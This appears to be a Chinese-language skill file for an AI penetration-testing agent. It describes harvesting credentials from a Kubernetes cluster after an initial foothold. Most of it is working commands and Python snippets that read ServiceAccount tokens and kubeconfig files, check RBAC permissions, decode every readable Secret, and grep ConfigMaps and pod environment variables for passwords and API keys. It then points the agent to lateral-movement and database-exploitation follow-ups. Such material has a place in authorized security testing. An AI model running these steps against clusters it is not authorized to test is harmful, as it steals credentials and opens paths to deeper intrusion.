---
name: collect-kubernetes-secrets
description: Kubernetes 集群敏感信息收集：ServiceAccount Token、Secret 对象、ConfigMap、RBAC 权限、Pod 环境变量中的凭据。当发现目标运行在 K8s 环境或获取到 kubeconfig/SA Token 时使用。
---

# Kubernetes Secrets 收集

当确认目标运行在 Kubernetes 环境中（发现 SA Token、kubeconfig、或 K8s API 可达）时，使用本 skill 系统化收集集群中的敏感信息和凭据。

> 前置条件：已获取 ServiceAccount Token / kubeconfig / 或可访问 K8s API Server。

---

## 一、OPSEC 与约束

| 原则 | 说明 |
|---|---|
| 只读 | 仅执行 get/list 操作，不 create/delete/patch |
| 不部署 | 不创建 Pod、Job、DaemonSet |
| 最小权限 | 先确认当前 SA 权限再操作 |
| 日志意识 | API Server audit log 记录所有请求 |
| 不外传 | 收集的 Secret 仅写入本地摘要 |

---

## 二、目标

- 确认 K8s 环境和当前身份权限
- 收集 Secret 对象（TLS 证书、Docker registry 凭据、Opaque secrets）
- 提取 ConfigMap 中的敏感配置
- 从 Pod 环境变量/挂载卷中发现凭据
- 评估 RBAC 权限边界和提权路径
- 发现集群网络拓扑和其他可达服务

---

## 三、Skill 元数据

- riskLevel: `medium`
- accessMode: `read_only`
- requiredTools: `CommandTools`
- optionalTools: `FileTools`, `HttpRequestTools`
- produces: `k8sProfile.cluster`, `k8sProfile.secrets[]`, `k8sProfile.rbac`, `credentials.fromK8s[]`, `openQuestions`
- structuredPatchPaths: `k8sProfile.secrets[]`, `credentials.fromK8s[]`
- recommendedNextSkills: `lateral-move-ssh`, `exploit-database-post`, `collect-cloud-metadata`
- forbiddenByDefault: 创建/删除资源、部署容器、修改 RBAC

---

## 四、工作流程

### 执行前：制定计划

1. **目标**：从 Kubernetes 集群中收集 Secret、ConfigMap 和凭据信息，发现横向移动路径。
2. **路径**：确认 K8s 环境 → 确定身份和权限 → 枚举 Namespace → 收集 Secrets/ConfigMap → Pod 环境变量 → RBAC 分析。
3. **终止条件**：可访问的 Namespace 和 Secret 均已遍历，或权限不足无法继续时停止。

### 第一阶段：环境确认与身份识别

```bash
# 检查是否在 Pod 内
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null

# 环境变量中的 K8s API 地址
env | grep -i KUBERNETES

# kubeconfig 搜索
find / -name "kubeconfig" -o -name ".kube" -o -name "admin.conf" 2>/dev/null
ls -la ~/.kube/config /etc/kubernetes/admin.conf 2>/dev/null

# kubectl 是否可用
which kubectl 2>/dev/null
kubectl version --short 2>/dev/null
```

**如果无 kubectl，使用 curl 直接访问 API：**

```bash
# 设置变量
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 测试连接
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces
```

### 第二阶段：权限确认（RBAC）

```bash
# 当前身份
kubectl auth whoami 2>/dev/null || kubectl get --raw /apis/authentication.k8s.io/v1/selfsubjectreviews -X POST -d '{}' 2>/dev/null

# 当前权限（can-i）
kubectl auth can-i --list 2>/dev/null
kubectl auth can-i get secrets --all-namespaces 2>/dev/null
kubectl auth can-i list pods --all-namespaces 2>/dev/null

# 关键权限检查
kubectl auth can-i create pods 2>/dev/null
kubectl auth can-i get secrets 2>/dev/null
kubectl auth can-i list namespaces 2>/dev/null
kubectl auth can-i '*' '*' 2>/dev/null  # cluster-admin 检查
```

**权限判断表：**

| 权限 | 攻击意义 |
|---|---|
| get secrets (all ns) | 可直接读取所有凭据 |
| create pods | 可挂载 Secret 到新 Pod |
| list nodes | 了解集群规模 |
| get pods (exec) | 可 exec 进入其他 Pod |
| `*` on `*` | cluster-admin，完全控制 |

### 第三阶段：Namespace 枚举与 Secret 收集

```bash
# 列出所有 Namespace
kubectl get namespaces

# 遍历每个 Namespace 的 Secret
kubectl get secrets --all-namespaces -o wide 2>/dev/null
# 如果权限不足，逐个尝试
kubectl get secrets -n default
kubectl get secrets -n kube-system
kubectl get secrets -n kube-public

# 获取 Secret 详情（base64 解码）
kubectl get secret <name> -n <namespace> -o jsonpath='{.data}' | python3 -c "
import sys,json,base64
data=json.loads(sys.stdin.read())
for k,v in data.items():
    print(f'{k}: {base64.b64decode(v).decode(errors=\"replace\")}')
"

# 按类型筛选高价值 Secret
kubectl get secrets --all-namespaces -o json | python3 -c "
import sys,json,base64
secrets=json.loads(sys.stdin.read())
for s in secrets.get('items',[]):
    stype=s.get('type','')
    if stype in ['Opaque','kubernetes.io/dockerconfigjson','kubernetes.io/tls','kubernetes.io/basic-auth']:
        ns=s['metadata']['namespace']
        name=s['metadata']['name']
        print(f'[{stype}] {ns}/{name}')
"
```

**Secret 类型优先级：**

| 类型 | 含义 | 优先级 |
|---|---|---|
| `Opaque` | 自定义凭据（数据库密码、API Key） | P0 |
| `kubernetes.io/dockerconfigjson` | 镜像仓库凭据 | P1 |
| `kubernetes.io/tls` | TLS 证书和私钥 | P1 |
| `kubernetes.io/basic-auth` | 用户名密码 | P0 |
| `kubernetes.io/service-account-token` | SA Token | P2 |

### 第四阶段：ConfigMap 敏感信息

```bash
# 列出 ConfigMap
kubectl get configmaps --all-namespaces

# 搜索含敏感信息的 ConfigMap
kubectl get configmaps --all-namespaces -o json | grep -i "password\|secret\|token\|key\|credential\|jdbc\|redis\|mysql" | head -30

# 获取具体 ConfigMap
kubectl get configmap <name> -n <namespace> -o yaml
```

### 第五阶段：Pod 环境变量与挂载

```bash
# 列出所有 Pod
kubectl get pods --all-namespaces -o wide

# 提取 Pod 环境变量（可能含凭据）
kubectl get pods --all-namespaces -o json | python3 -c "
import sys,json
pods=json.loads(sys.stdin.read())
for pod in pods.get('items',[]):
    ns=pod['metadata']['namespace']
    name=pod['metadata']['name']
    for c in pod['spec'].get('containers',[]):
        for env in c.get('env',[]):
            val=env.get('value','')
            ename=env.get('name','')
            if any(k in ename.upper() for k in ['PASSWORD','SECRET','TOKEN','KEY','CREDENTIAL','API_KEY']):
                print(f'{ns}/{name} ({c[\"name\"]}): {ename}={val}')
"

# 检查 Volume 挂载（发现 Secret 挂载路径）
kubectl get pods <pod> -n <namespace> -o jsonpath='{.spec.volumes[*]}' 2>/dev/null
kubectl get pods <pod> -n <namespace> -o jsonpath='{.spec.containers[*].volumeMounts[*]}' 2>/dev/null
```

### 第六阶段：集群服务发现

```bash
# Service 列表（内网服务拓扑）
kubectl get services --all-namespaces -o wide

# Endpoints（实际 Pod IP）
kubectl get endpoints --all-namespaces

# Ingress（外部暴露的服务）
kubectl get ingress --all-namespaces

# 集群 DNS（发现服务名）
cat /etc/resolv.conf
nslookup kubernetes.default.svc.cluster.local 2>/dev/null
```

---

## 五、工具优先级

| 优先级 | 工具 | 用途 |
|---|---|---|
| 1 | `CommandTools.exec` | kubectl 命令执行 |
| 2 | `CommandTools.exec` | 大规模枚举（可能耗时） |
| 3 | `HttpRequestTools` | 直接 API Server 调用（无 kubectl 时） |
| 4 | `FileTools` | 读取 SA Token、kubeconfig |

---

## 六、输出格式

```markdown
## Kubernetes Secrets 收集摘要

**集群 API**：{api_server}
**当前身份**：{service_account / user}
**权限级别**：{cluster-admin / namespace-scoped / limited}
**可访问 Namespace 数**：{n}
**Secret 总数**：{n}
**发现凭据数**：{n}

---

## 身份与权限

| 权限 | 范围 | 攻击意义 |
|------|------|---------|

## 收集的 Secrets

| Namespace | 名称 | 类型 | 关键字段 | 值/摘要 |
|-----------|------|------|---------|---------|

## ConfigMap 敏感信息

| Namespace | 名称 | 敏感字段 | 值 |
|-----------|------|---------|-----|

## Pod 环境变量凭据

| Namespace/Pod | 容器 | 变量名 | 值 |
|--------------|------|--------|-----|

## 集群服务拓扑

| Namespace | 服务名 | ClusterIP:Port | 类型 | 备注 |
|-----------|--------|---------------|------|------|

## 提权路径评估

{基于 RBAC 分析的提权可能性}

## 下一步建议

2~3 条建议
```

---

## 七、结构化摘要写入

```json
{
  "k8sProfile": {
    "cluster": {
      "apiServer": "https://10.96.0.1:443",
      "version": "1.27",
      "identity": "system:serviceaccount:default:app-sa",
      "permissionLevel": "namespace-scoped"
    },
    "secrets": [
      {"namespace": "production", "name": "db-credentials", "type": "Opaque", "keys": ["username", "password"], "target": "mysql"},
      {"namespace": "production", "name": "registry-creds", "type": "dockerconfigjson", "registry": "harbor.internal:5000"}
    ],
    "rbac": {
      "canGetSecrets": true,
      "canCreatePods": false,
      "canExecPods": true,
      "scope": "namespace:production,default"
    },
    "services": [
      {"namespace": "production", "name": "mysql", "clusterIP": "10.96.5.20", "port": 3306},
      {"namespace": "production", "name": "redis", "clusterIP": "10.96.5.21", "port": 6379}
    ]
  },
  "credentials": {
    "fromK8s": [
      {"source": "secret/db-credentials", "namespace": "production", "type": "basic-auth", "username": "app_user", "secret": "DbP@ss2024", "target": "mysql://10.96.5.20:3306"},
      {"source": "pod/env", "namespace": "production", "type": "api_key", "key": "STRIPE_SECRET_KEY", "secret": "sk_live_...", "target": "stripe"}
    ]
  },
  "openQuestions": ["exploit-database-post (mysql://10.96.5.20)", "lateral-move-ssh (node access)"]
}
```

---

## 八、决策规则

| 场景 | 行为 |
|---|---|
| 非 K8s 环境（无 SA Token/API） | 终止，报告非容器化环境 |
| kubectl 不可用 | 回退到 curl + API Server |
| 权限不足（403） | 记录已知权限边界，报告受限范围 |
| cluster-admin | 标记最高优先级，全面枚举 |
| Secret 值为空或被 seal | 标注加密状态（Sealed Secrets/Vault） |
| 发现数据库凭据 | 立即记录，建议 exploit-database-post |
| 发现镜像仓库凭据 | 记录，可能用于供应链攻击评估 |
| API Server 不可达 | 检查网络策略，报告隔离状态 |
